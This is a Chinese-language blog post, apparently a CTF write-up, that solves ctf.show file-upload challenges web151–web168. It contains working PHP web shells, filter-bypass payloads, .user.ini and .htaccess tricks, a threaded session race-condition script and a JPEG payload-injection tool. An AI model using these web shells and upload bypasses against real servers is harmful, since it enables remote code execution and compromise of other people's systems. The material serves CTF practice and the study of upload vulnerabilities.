<!DOCTYPE html>
<html data-theme="">
<head>
    <!-- ! 引用文件位置-->
    <!--引用文件位置-->
<meta charset="utf-8">
<title>原神，启动！！</title>
<!--    daisyui cdn-->
<link href="https://cdn.jsdelivr.net/npm/daisyui@4.5.0/dist/full.min.css" rel="stylesheet" type="text/css"/>
<!--     tailwindcss cdn daisyui 前置-->
<script src="https://cdn.tailwindcss.com"></script>
<!--    更改主题颜色-->
<script src="https://cdn.jsdelivr.net/npm/theme-change@2.0.2/index.js"></script>
<!--自动排版-->
<!--    <link rel="stylesheet" href="https://unpkg.com/@tailwindcss/typography@^0.4.0/dist/typography.min.css" type="text/css">-->
<script src="https://cdn.tailwindcss.com?plugins=forms,typography,aspect-ratio,line-clamp"></script>
<!--    谷歌字体库镜像-->
<style>
    @import url('https://fonts.font.im/css?family=Barlow:700|Bitter');
</style>
<!--jquery-->
<script src="https://cdn.staticfile.org/jquery/1.10.2/jquery.min.js"></script>
<!--    fancybox-->
<link rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" type="text/css">
<script src="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js"></script>
<!--highlight 代码高亮 使用hexo的不会高亮-->
<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@latest/build/highlight.min.js"></script>
<script>
    hljs.highlightAll();
</script>
<link rel="stylesheet"
      href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@latest/build/styles/vs2015.min.css">
<!--LeanCLoud-->
<script src="https://cdn.jsdelivr.net/npm/leancloud-storage@4.15.2/dist/av.min.js"></script>
<!--卜算子busuanzi-->
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<!--    自定义css-->

<link rel="stylesheet" href="/css/output.css">


<link rel="stylesheet" href="/css/style.css">

<!--    自定义js-->

<script src="/js/view.js"></script>


<script src="/js/fancybox.js"></script>


<script src="/js/search.js"></script>

<!--去除referrer检测 要写在head里面 但是似乎影响进站查看-->
<meta name="referrer" content="no-referrer"/>
<meta name="generator" content="Hexo 7.0.0"></head>
<body>
<!--导航栏-->
<div class="fixed z-10 w-full">
    <div class="container-nav justify-center flex">
        <div class="navbar bg-base-100 shadow-xl rounded-box w-10/12 my-6 z-10">
            <div class="flex-1">
                <a class="btn btn-ghost text-xl" href="/">Natro92&#39;s Site</a>
            </div>
            <div class="flex-none gap-2">
                <ul class="menu menu-horizontal px-1">
                    
                    
                        
                            <!--去掉最后一位是，-->
                            <li><a href="/">首页</a></li>
                        
                            <!--去掉最后一位是，-->
                            <li><a href="/blogs">归档</a></li>
                        
                            <!--去掉最后一位是，-->
                            <li><a href="/tags">标签</a></li>
                        
                            <!--去掉最后一位是，-->
                            <li><a href="/categories">分类</a></li>
                        
                            <!--去掉最后一位是，-->
                            <li><a href="/link">更多</a></li>
                        
                    
                    <!--<li><a href="/">Home</a></li>-->
                    <!--<li><a href="/blogs">Archive</a></li>-->
                    <!--<li><a href="/about/">About</a></li>-->
                    <li>
                        <details class="dropdown">
                            <summary>
                                更换主题
                            </summary>
                            <ul tabindex="0"
                                class="dropdown-content z-[1] p-2 bg-base-100 rounded-box w-58 max-h-96 overflow-y-auto overflow-x-hidden shadow">
                                <!--                                <li><a class="border-base-content/20 hover:border-base-content/40 overflow-hidden rounded-lg border outline outline-2 outline-offset-2 outline-transparent !outline-base-content" data-set-theme="emerald" data-act-class="!outline-base-content"><div data-theme="emerald" class="bg-base-100 text-base-content w-full cursor-pointer font-sans"><div class="grid grid-cols-5 grid-rows-3"><div class="bg-base-200 col-start-1 row-span-2 row-start-1"></div> <div class="bg-base-300 col-start-1 row-start-3"></div> <div class="bg-base-100 col-span-4 col-start-2 row-span-3 row-start-1 flex flex-col gap-1 p-2"><div class="font-bold">emerald</div> <div class="flex flex-wrap gap-1"><div class="bg-primary flex aspect-square w-5 items-center justify-center rounded lg:w-6"><div class="text-primary-content text-sm font-bold">A</div></div> <div class="bg-secondary flex aspect-square w-5 items-center justify-center rounded lg:w-6"><div class="text-secondary-content text-sm font-bold">A</div></div> <div class="bg-accent flex aspect-square w-5 items-center justify-center rounded lg:w-6"><div class="text-accent-content text-sm font-bold">A</div></div> <div class="bg-neutral flex aspect-square w-5 items-center justify-center rounded lg:w-6"><div class="text-neutral-content text-sm font-bold">A</div></div></div></div></div></div> </a></li>-->
                                <!--主题选择配置，主题来自daisyui-->

<li><a data-set-theme="light">Light</a></li>
<li><a data-set-theme="dark">Night</a></li>
<li><a data-set-theme="cupcake">Cupcake</a></li>
<li><a data-set-theme="bumblebee">Bumblebee</a></li>
<li><a data-set-theme="emerald">Emerald</a></li>
<li><a data-set-theme="coporate">Corporate</a></li>
<li><a data-set-theme="synthwave">Synthwave</a></li>
<li><a data-set-theme="retro">Retro</a></li>
<li><a data-set-theme="cyberpunk">Cyberpunk</a></li>
<li><a data-set-theme="halloween">Halloween</a></li>
<li><a data-set-theme="garden">Garden</a></li>
<li><a data-set-theme="forest">Forest</a></li>
<li><a data-set-theme="aqua">Aqua</a></li>
<li><a data-set-theme="lofi">Lo-fi</a></li>
<li><a data-set-theme="pastel">Pastel</a></li>
<li><a data-set-theme="fantasy">Fantasy</a></li>
<li><a data-set-theme="wireframe">Wireframe</a></li>
<li><a data-set-theme="black">Black</a></li>
<li><a data-set-theme="luxury">Luxury</a></li>
<li><a data-set-theme="dracula">Dracula</a></li>
<li><a data-set-theme="cmyk">CMYK</a></li>
<li><a data-set-theme="autumn">Autumn</a></li>
<li><a data-set-theme="business">Business</a></li>
<li><a data-set-theme="acid">Acid</a></li>
<li><a data-set-theme="lemonade">Lemonade</a></li>
<li><a data-set-theme="night">Night</a></li>
<li><a data-set-theme="coffee">Coffee</a></li>
<li><a data-set-theme="winter">Winter</a></li>
<li><a data-set-theme="dim">Dim</a></li>
<li><a data-set-theme="nord">Nord</a></li>
<li><a data-set-theme="sunset">Sunset</a></li>
                            </ul>
                        </details>
                    </li>
                </ul>
                <div class="form-control">

                    <input type="text" placeholder="Search is not yet!" id="local-search-input"
                           class="st-search-input input input-bordered w-24 md:w-auto rounded-xl"/>
                    <div id="local-search-result" class="local-search-result-cls rounded-xl"></div>
                    <script type="text/javascript" id="local.search.active">
                        var inputArea = document.querySelector("#local-search-input");
                        inputArea.onclick = function () {
                            getSearchFile();
                            this.onclick = null
                        }
                        inputArea.onkeydown = function () {
                            if (event.keyCode === 13) return false
                        }
                    </script>
                </div>
                <div class="dropdown dropdown-end">
                    <div tabindex="0" role="button" class="btn btn-ghost btn-circle avatar">
                        <div class="w-10 rounded-full">
                            <a target="_blank" rel="noopener" href="https://github.com/natro92">
                                <img alt="Tailwind CSS Navbar component"
                                     src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1706006117478-a75e82ba-dea0-46bd-be3b-fa82cb80209c.png"/>
                            </a>
                        </div>
                    </div>
                    <!--TODO 完成这里-->
                    <!--<ul tabindex="0"-->
                    <!--    class="mt-3 z-[1] p-2 shadow menu menu-sm dropdown-content bg-base-100 rounded-box w-52">-->
                    <!--    <li>-->
                    <!--        <a class="justify-between">-->
                    <!--            Profile-->
                    <!--            <span class="badge">New</span>-->
                    <!--        </a>-->
                    <!--    </li>-->
                    <!--    <li><a>Settings</a></li>-->
                    <!--    <li><a>Logout</a></li>-->
                    <!--</ul>-->
                </div>
            </div>
        </div>
    </div>
</div>
<!--导航栏结束-->
<div class="fleet">
    <!--    嵌套位置-->
    <!-- 博客详情 -->


<!--Post开始-->
<div class="fleet container-nav justify-center flex mb-16 w-full">
    <div class="w-8/12 justify-center flex">
        <div class="fleet-body flex-col w-full">
            <div class="fleet-header">
                <div class="fleet-content-header-title text-6xl">
                    <h1 class="inline-block font-extrabold mt-16 mb-8">web151-web170文件上传篇</h1>
                </div>
                <div class="fleet-content-header-info">
                    <span>2023/07/09 19:37:48</span>
                </div>
            </div>
            <div class="divider w-full"></div>
            <div class="fleet-content mt-8">
                <div class="fleet-content-body">
                    <div class="fleet-content-body-content justify-center flex w-full">
                        
                        <!--代码块-->
                        <!--高亮使用的prismjs需要将class中的python改为language-python-->
                        
                        <!--图片-->
                        
                        <article class="prose">
                            <h1 id="web151、web152"><a href="#web151、web152" class="headerlink" title="web151、web152"></a>web151、web152</h1><h3 id="前端校验"><a href="#前端校验" class="headerlink" title="前端校验"></a>前端校验</h3><p>根据提示，检验写在了前端。</p>
<pre class="language-php" data-language="php"><code class="language-php">layui.use(&#39;upload&#39;, function()&#123;
  var upload &#x3D; layui.upload;
   
  &#x2F;&#x2F;执行实例
  var uploadInst &#x3D; upload.render(&#123;
    elem: &#39;#upload&#39; &#x2F;&#x2F;绑定元素
    ,url: &#39;&#x2F;upload&#x2F;&#39; &#x2F;&#x2F;上传接口
    ,done: function(res)&#123;
    	if(res.code&#x3D;&#x3D;0)&#123;
    		$(&quot;#result&quot;).html(&quot;文件上传成功，路径：&quot;+res.msg);
    	&#125;else&#123;
    		$(&quot;#result&quot;).html(&quot;文件上传失败，失败原因：&quot;+res.msg);
    	&#125;
      
    &#125;
    ,error: function()&#123;
      $(&quot;#result&quot;).html(&quot;文件上传失败&quot;);
    &#125;
  &#125;);
&#125;);</code></pre>
<p>检测写在前端了，写入php一句话木马，修改后缀为png。上传并抓包。修改文件后缀为需要的php后缀，并访问所需目录：<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688402955857-f686aac1-0654-4ed7-917d-cfca7ddd6fce.png" alt="image.png"><br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688402971003-055c2997-e4ed-4ed8-9305-7289cd1bee30.png" alt="image.png"><br>payload：GET：<code>?1=system(&#39;tac ../flag.php&#39;);</code></p>
<h1 id="web153"><a href="#web153" class="headerlink" title="web153"></a>web153</h1><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.dazhuanlan.com/vip_mmles/topics/1547397">https://www.dazhuanlan.com/vip_mmles&#x2F;topics&#x2F;1547397</a> userini</p>
</blockquote>
<h3 id="user-ini"><a href="#user-ini" class="headerlink" title="user.ini"></a>user.ini</h3><p>whatweb指纹识别，发现是nginx，而且在upload页面下发现index.php文件。而且很容易上传如php5,phtml等类型文件，但是不解析，需要上传.user.ini，使文件解析。<br>.user.ini里面可以写：让所有文件都包含该文件</p>
<pre class="language-php" data-language="php"><code class="language-php">auto_prepend_file &#x3D; 1.txt</code></pre>
<p><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688404601489-6ec09a2c-4a79-4083-b328-5d72e5cb6763.png" alt="image.png"><br>然后再上传图片马或者直接上传一句话木马文本即可。<br>上传1.txt内容为：</p>
<pre class="language-php" data-language="php"><code class="language-php">&lt;?php ($_GET[1])($_GET[2]);</code></pre>
<p>然后访问upload&#x2F;index.php并传入payload即可：<br><code>upload/index.php?1=system&amp;2=tac ../fla*</code></p>
<h1 id="web154"><a href="#web154" class="headerlink" title="web154"></a>web154</h1><p>同153上传.user.ini 然后上传图片马。<br>在前面一题的基础上增加了内容过滤,过滤了php , 可以用大小写来绕过。<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688405318328-4eb99034-670a-4fe6-ac18-e23af1e2451d.png" alt="image.png"><br>payload同上题目即可。<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688405482171-89b0dee7-b7a0-4359-b477-396cfe446689.png" alt="image.png"></p>
<h1 id="web155"><a href="#web155" class="headerlink" title="web155"></a>web155</h1><h3 id="短标签"><a href="#短标签" class="headerlink" title="短标签"></a>短标签</h3><p>上传彻底禁用了php 大小写都不行。<br>还是先上传.user.ini 然后使用短标签，建议使用&lt;?&#x3D;短标签即可<br>短标签：</p>
<pre class="language-php" data-language="php"><code class="language-php">&lt;? echo &#39;123&#39;;?&gt; &#x2F;&#x2F;short_open_tags&#x3D;on
&lt;?&#x3D;(表达式)?&gt;  等价于 &lt;?php echo (表达式)?&gt; &#x2F;&#x2F;无限制
&lt;% echo &#39;123&#39;;%&gt; &#x2F;&#x2F;asp_tags&#x3D;on php_version &lt; 7
&lt;script language&#x3D;”php”&gt;echo &#39;123&#39;; &lt;&#x2F;script&gt; &#x2F;&#x2F;php_vsesion &lt; 7
</code></pre>
<p>1.png：<code>&lt;?=system($_GET[1]);</code><br>payload:<code>upload/index.php?1=phpinfo&amp;2=tac ../f*</code></p>
<h1 id="web156"><a href="#web156" class="headerlink" title="web156"></a>web156</h1><p>经过测试过滤了[ ,可以用{}代替[],其它的步骤和前面几个一致<br>1.png : <code>&lt;?=system($_GET&#123;1&#125;);</code></p>
<h1 id="web157"><a href="#web157" class="headerlink" title="web157"></a>web157</h1><p>又过滤了;和{<br>1.png <code>&lt;?=(system(&#39;nl ../*.ph*&#39;))?&gt;</code><br>注意使用方式可以省略分号，</p>
<h1 id="web158、web159"><a href="#web158、web159" class="headerlink" title="web158、web159"></a>web158、web159</h1><p>1.png <code>&lt;?=</code>tac ..&#x2F;f*<code>?&gt;</code></p>
<h1 id="web159"><a href="#web159" class="headerlink" title="web159"></a>web159</h1><h3 id="日志包含"><a href="#日志包含" class="headerlink" title="日志包含"></a>日志包含</h3><p>这题将空格和&#96;&#96;反引号和log过滤掉了，所以上传的时候要注意略过多余的空格，log可以用点号拼接绕过，且本题不能使用上题的方法。<br>nginx的日志文件在&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log里</p>
<p>注意这次的.user.ini文件内容是：<br><code>auto_prepend_file=1.png</code>需要将等号两端空格删除<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688446683068-0bcfe710-e681-4a91-aa17-840a2c552880.png" alt="image.png">1.png <code>&lt;?=include&quot;/var/lo&quot;.&quot;g/nginx/access.lo&quot;.&quot;g&quot;?&gt;</code><br>按照wp这种写法 会发现提示格式错误。<br>经过查询资料发现，正确的写法应该是：<br>将include和地址中间加一个换行。<br>先用1标记一下：<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688447711896-937e1a62-fa1a-4d66-a9f2-ae783d511c8a.png" alt="image.png"><br>切换到hex部分<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688447786035-2cd193c2-79dd-437c-955c-bf878c13b927.png" alt="image.png"><br>将1改为0d即可上传成功<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688447819911-82544bdd-ea96-40a4-93d5-39096e9badf1.png" alt="image.png"><br>直接访问即可：<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688448270283-a83e5567-2d1c-4f82-9ee1-50e690b068d3.png" alt="image.png"> </p>
<h1 id="web161"><a href="#web161" class="headerlink" title="web161"></a>web161</h1><h3 id="图片头"><a href="#图片头" class="headerlink" title="图片头"></a>图片头</h3><p>加上图片头：</p>
<pre class="language-php" data-language="php"><code class="language-php">GIF89A</code></pre>
<p><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688480295049-d3bc1e6b-07ae-4e94-99d2-a3445fcc1b94.png" alt="image.png"><br>图片马同理<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688480375207-109baf2b-5e1b-47b9-93ae-a86cc031df77.png" alt="image.png"><br>UA传入一句话木马。</p>
<h1 id="web162、web163（远程文件包含-这里不复现了-条件竞争需要后半夜-挺不住）"><a href="#web162、web163（远程文件包含-这里不复现了-条件竞争需要后半夜-挺不住）" class="headerlink" title="web162、web163（远程文件包含 这里不复现了 条件竞争需要后半夜 挺不住）"></a>web162、web163（远程文件包含 这里不复现了 条件竞争需要后半夜 挺不住）</h1><p>过滤了<code>.</code>，所以不能利用日志包含了，先正常上传.user.ini<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688481049862-c54f9e2a-74b3-40c2-a695-f853daba81d5.png" alt="image.png"></p>
<h2 id="方法一-远程文件包含"><a href="#方法一-远程文件包含" class="headerlink" title="方法一 远程文件包含"></a>方法一 远程文件包含</h2><p>因为不能有.所以将IP转换为十进制，然后修改默认为一句话木马。也就是：<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688481931827-fd1cc178-4590-4fa9-a4a5-c2f8c1e80c9d.png" alt="image.png"><br>这里由于需要修改默认页面过于麻烦，这里就没有复现。</p>
<h2 id="方法二-session条件竞争"><a href="#方法二-session条件竞争" class="headerlink" title="方法二 session条件竞争"></a>方法二 session条件竞争</h2><p>利用session.upload_progress将木马写入session文件，然后包含这个session文件。<br>首先在.user.ini包含&#x2F;tmp&#x2F;sess_test</p>
<pre class="language-php" data-language="php"><code class="language-php"># -*- coding: utf-8 -*-
# @Time : 20.12.5 13:52
# @author:lonmar
import io
import requests
import threading

sessid &#x3D; &#39;test&#39;
data &#x3D; &#123;
    &quot;ctf&quot;: &quot;&#x2F;tmp&#x2F;sess_test&quot;,
    &quot;cmd&quot;: &#39;system(&quot;tac ..&#x2F;f*&quot;);&#39;
&#125;


def write(session):
    while event.isSet():
        f &#x3D; io.BytesIO(b&#39;a&#39; * 1024 * 50)
        resp &#x3D; session.post(&#39;http:&#x2F;&#x2F;73c8baa3-fd27-4ce6-90d6-107d6eb00f5b.challenge.ctf.show&#x2F;&#39;,
                            data&#x3D;&#123;&#39;PHP_SESSION_UPLOAD_PROGRESS&#39;: &#39;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#39;&#125;,
                            files&#x3D;&#123;&#39;file&#39;: (&#39;test.txt&#39;, f)&#125;, cookies&#x3D;&#123;&#39;PHPSESSID&#39;: sessid&#125;)


def read(session):
    while event.isSet():
        res &#x3D; session.post(
            &#39;http:&#x2F;&#x2F;73c8baa3-fd27-4ce6-90d6-107d6eb00f5b.challenge.ctf.show&#x2F;&#39;,
            data&#x3D;data
        )
        if &#39;ctfshow&#123;&#39; in res.text:
            print(res.text)
            event.clear()
        else:
            print(&#39;[*]retrying...&#39;)


if __name__ &#x3D;&#x3D; &quot;__main__&quot;:
    event &#x3D; threading.Event()
    event.set()
    with requests.session() as session:
        for i in range(1, 5):
            threading.Thread(target&#x3D;write, args&#x3D;(session,)).start()

        for i in range(1, 5):
            threading.Thread(target&#x3D;read, args&#x3D;(session,)).start()
</code></pre>
<p>但是不知道为什么一直也竞争不到。<br>应该是线程的原因，他这个竞争条件只有后半夜才开放。这里就不复现了。</p>
<h1 id="web164"><a href="#web164" class="headerlink" title="web164"></a>web164</h1><p>使用生成图片马：<br><a target="_blank" rel="noopener" href="https://github.com/huntergregal/PNG-IDAT-Payload-Generator">https://github.com/huntergregal/PNG-IDAT-Payload-Generator</a><br>使用命令：</p>
<pre class="language-php" data-language="php"><code class="language-php">python generate.py -m php -o 1.png</code></pre>
<p>生成的图片文本内容会出现：<code>&lt;?=$_GET[0]($_POST[1]);?&gt;</code><br>对应传值。<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688889962772-0ebf85cd-590f-41dc-88d7-5d5554df2bf9.png" alt="image.png"><br>下载图片，以文本的格式打开就会发现内容。<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688890006709-fa1d6252-3631-4a0a-bd11-062d0f875536.png" alt="image.png"></p>
<h1 id="web165（傻逼库一直导不进去）"><a href="#web165（傻逼库一直导不进去）" class="headerlink" title="web165（傻逼库一直导不进去）"></a>web165（傻逼库一直导不进去）</h1><h3 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h3><p>这次图片上传之后会被二次渲染。<br>可以先将图片渲染一张，然后再写入木马。<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688890383585-00cf1a9c-19b5-4f12-bafc-08a45e71214b.png" alt="image.png"><br>二次渲染之后写入木马：</p>
<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
&#x2F;*

The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().
It is necessary that the size and quality of the initial image are the same as those of the processed image.

1) Upload an arbitrary image via secured files upload script
2) Save the processed image and launch:
jpg_payload.php &lt;jpg_name.jpg&gt;

In case of successful injection you will get a specially crafted image, which should be uploaded again.

Since the most straightforward injection method is used, the following problems can occur:
1) After the second processing the injected data may become partially corrupted.
2) The jpg_payload.php script outputs &quot;Something&#39;s wrong&quot;.
If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.

Sergey Bobrov @Black2Fan.

See also:
https:&#x2F;&#x2F;www.idontplaydarts.com&#x2F;2012&#x2F;06&#x2F;encoding-web-shells-in-png-idat-chunks&#x2F;

*&#x2F;

$miniPayload &#x3D; &quot;&lt;?&#x3D;eval(\$_POST[7]);?&gt;&quot;; &#x2F;&#x2F;注意$转义


if(!extension_loaded(&#39;gd&#39;) || !function_exists(&#39;imagecreatefromjpeg&#39;)) &#123;
    die(&#39;php-gd is not installed&#39;);
&#125;

if(!isset($argv[1])) &#123;
    die(&#39;php jpg_payload.php &lt;jpg_name.jpg&gt;&#39;);
&#125;

set_error_handler(&quot;custom_error_handler&quot;);

for($pad &#x3D; 0; $pad &lt; 1024; $pad++) &#123;
    $nullbytePayloadSize &#x3D; $pad;
    $dis &#x3D; new DataInputStream($argv[1]);
    $outStream &#x3D; file_get_contents($argv[1]);
    $extraBytes &#x3D; 0;
    $correctImage &#x3D; TRUE;

    if($dis-&gt;readShort() !&#x3D; 0xFFD8) &#123;
        die(&#39;Incorrect SOI marker&#39;);
    &#125;

    while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() &#x3D;&#x3D; 0xFF)) &#123;
        $marker &#x3D; $dis-&gt;readByte();
        $size &#x3D; $dis-&gt;readShort() - 2;
        $dis-&gt;skip($size);
        if($marker &#x3D;&#x3D;&#x3D; 0xDA) &#123;
            $startPos &#x3D; $dis-&gt;seek();
            $outStreamTmp &#x3D;
                substr($outStream, 0, $startPos) .
                $miniPayload .
                str_repeat(&quot;\0&quot;,$nullbytePayloadSize) .
                substr($outStream, $startPos);
            checkImage(&#39;_&#39;.$argv[1], $outStreamTmp, TRUE);
            if($extraBytes !&#x3D;&#x3D; 0) &#123;
                while((!$dis-&gt;eof())) &#123;
                    if($dis-&gt;readByte() &#x3D;&#x3D;&#x3D; 0xFF) &#123;
                        if($dis-&gt;readByte !&#x3D;&#x3D; 0x00) &#123;
                            break;
                        &#125;
                    &#125;
                &#125;
                $stopPos &#x3D; $dis-&gt;seek() - 2;
                $imageStreamSize &#x3D; $stopPos - $startPos;
                $outStream &#x3D;
                    substr($outStream, 0, $startPos) .
                    $miniPayload .
                    substr(
                        str_repeat(&quot;\0&quot;,$nullbytePayloadSize).
                        substr($outStream, $startPos, $imageStreamSize),
                        0,
                        $nullbytePayloadSize+$imageStreamSize-$extraBytes) .
                    substr($outStream, $stopPos);
            &#125; elseif($correctImage) &#123;
                $outStream &#x3D; $outStreamTmp;
            &#125; else &#123;
                break;
            &#125;
            if(checkImage(&#39;payload_&#39;.$argv[1], $outStream)) &#123;
                die(&#39;Success!&#39;);
            &#125; else &#123;
                break;
            &#125;
        &#125;
    &#125;
&#125;
unlink(&#39;payload_&#39;.$argv[1]);
die(&#39;Something\&#39;s wrong&#39;);

function checkImage($filename, $data, $unlink &#x3D; FALSE) &#123;
    global $correctImage;
    file_put_contents($filename, $data);
    $correctImage &#x3D; TRUE;
    imagecreatefromjpeg($filename);
    if($unlink)
        unlink($filename);
    return $correctImage;
&#125;

function custom_error_handler($errno, $errstr, $errfile, $errline) &#123;
    global $extraBytes, $correctImage;
    $correctImage &#x3D; FALSE;
    if(preg_match(&#39;&#x2F;(\d+) extraneous bytes before marker&#x2F;&#39;, $errstr, $m)) &#123;
        if(isset($m[1])) &#123;
            $extraBytes &#x3D; (int)$m[1];
        &#125;
    &#125;
&#125;

class DataInputStream &#123;
    private $binData;
    private $order;
    private $size;

    public function __construct($filename, $order &#x3D; false, $fromString &#x3D; false) &#123;
        $this-&gt;binData &#x3D; &#39;&#39;;
        $this-&gt;order &#x3D; $order;
        if(!$fromString) &#123;
            if(!file_exists($filename) || !is_file($filename))
                die(&#39;File not exists [&#39;.$filename.&#39;]&#39;);
            $this-&gt;binData &#x3D; file_get_contents($filename);
        &#125; else &#123;
            $this-&gt;binData &#x3D; $filename;
        &#125;
        $this-&gt;size &#x3D; strlen($this-&gt;binData);
    &#125;

    public function seek() &#123;
        return ($this-&gt;size - strlen($this-&gt;binData));
    &#125;

    public function skip($skip) &#123;
        $this-&gt;binData &#x3D; substr($this-&gt;binData, $skip);
    &#125;

    public function readByte() &#123;
        if($this-&gt;eof()) &#123;
            die(&#39;End Of File&#39;);
        &#125;
        $byte &#x3D; substr($this-&gt;binData, 0, 1);
        $this-&gt;binData &#x3D; substr($this-&gt;binData, 1);
        return ord($byte);
    &#125;

    public function readShort() &#123;
        if(strlen($this-&gt;binData) &lt; 2) &#123;
            die(&#39;End Of File&#39;);
        &#125;
        $short &#x3D; substr($this-&gt;binData, 0, 2);
        $this-&gt;binData &#x3D; substr($this-&gt;binData, 2);
        if($this-&gt;order) &#123;
            $short &#x3D; (ord($short[1]) &lt;&lt; 8) + ord($short[0]);
        &#125; else &#123;
            $short &#x3D; (ord($short[0]) &lt;&lt; 8) + ord($short[1]);
        &#125;
        return $short;
    &#125;

    public function eof() &#123;
        return !$this-&gt;binData||(strlen($this-&gt;binData) &#x3D;&#x3D;&#x3D; 0);
    &#125;
&#125;
?&gt;
</code></pre>
<p>注意使用之前要导入php的gd库<br>然后注入即可，但是这里我的库没导入明白。所以尝试一下对比渲染前后两个文件。发现内容有部分不会改变，可以在不变处注入木马。<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688892427399-bbc837a0-d38d-4ca2-beea-d9b59d3feb7b.png" alt="image.png"><br>试了一下 似乎不太行。<br>太重量级了 ，一直提示下不下来gd扩展。<br>气麻了。不做了。</p>
<h1 id="web166"><a href="#web166" class="headerlink" title="web166"></a>web166</h1><p>检测是否为zip，穿一个zip然后直接在bp里面抓包即可。<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688899018551-9b58895b-38e1-4f92-831e-1d312225a70d.png" alt="image.png"></p>
<h1 id="web167"><a href="#web167" class="headerlink" title="web167"></a>web167</h1><h3 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h3><p>使用<code>.htaccess</code>的一个要求就是使用apache<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688899252427-86a535b8-9d71-4995-9c36-56b8e1ecd69e.png" alt="image.png"><br>htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。<br>概述来说，htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p>
<pre class="language-php" data-language="php"><code class="language-php">AddType application&#x2F;x-httpd-php .jpg   &#x2F;&#x2F;将.png后缀的文件解析 成php</code></pre>
<p><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688899639889-8d65e30b-7273-496a-82fd-4e5af74b68a3.png" alt="image.png"><br>再传一个jpg为后缀的一句话木马。<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688899700671-4d857077-8ad6-4548-bc54-25ea14f1c8c6.png" alt="image.png"></p>
<h1 id="web168"><a href="#web168" class="headerlink" title="web168"></a>web168</h1><h3 id="基础免杀"><a href="#基础免杀" class="headerlink" title="基础免杀"></a>基础免杀</h3><p>过滤了关键字eval system<br>就简单用</p>
<pre class="language-php" data-language="php"><code class="language-php">&lt;?&#x3D;&#96;tac ..&#x2F;f*&#96;?&gt;</code></pre>
